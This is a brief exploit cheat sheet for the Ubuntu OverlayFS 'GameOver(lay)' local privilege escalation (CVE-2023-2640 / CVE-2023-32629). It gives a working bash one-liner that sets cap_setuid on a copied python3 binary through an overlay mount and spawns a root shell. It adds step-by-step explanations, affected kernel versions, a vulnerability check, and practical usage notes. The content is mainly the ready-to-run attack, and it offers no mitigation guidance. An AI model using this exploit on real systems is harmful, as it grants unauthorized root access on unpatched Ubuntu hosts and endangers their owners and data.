# Ubuntu OverlayFS GameOver(lay) (CVE-2023-2640 / CVE-2023-32629)

Ubuntu-patched kernel introduced a bug where OverlayFS allows setting capabilities on binaries in the upper directory. Combined with `setcap cap_setuid+eip`, this allows privilege escalation to root.

## One-Liner Exploit

```bash
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("bash")'
```

Step by step:
1. `unshare -rm` — create new user+mount namespace as root
2. Copy python3 to `l/` (lower dir), `setcap cap_setuid+eip` on it
3. Mount overlay: `l` = lower, `u` = upper, `w` = work, `m` = merged
4. `touch m/*` — triggers copy-up of the capabilitied binary to upper dir `u/`
5. Exit namespace; `u/python3` retains cap_setuid in original namespace
6. `os.setuid(0); os.system("bash")` — root shell

## Affected Versions

- Ubuntu 23.04 (Lunar) with kernel < 6.3.0
- Ubuntu 22.04 (Jammy) with kernel < 5.15.0-78
- Ubuntu 20.04 (Focal) with kernel < 5.4.0-155

## Check Vulnerability

```bash
uname -r       # check kernel version
cat /etc/lsb-release
```

## Notes

- Requires `unshare` to be available (usually is on Ubuntu)
- No additional packages needed — uses only built-in Python3 and shell
- Exploit creates `u/` directory in current working directory; run from a writable location
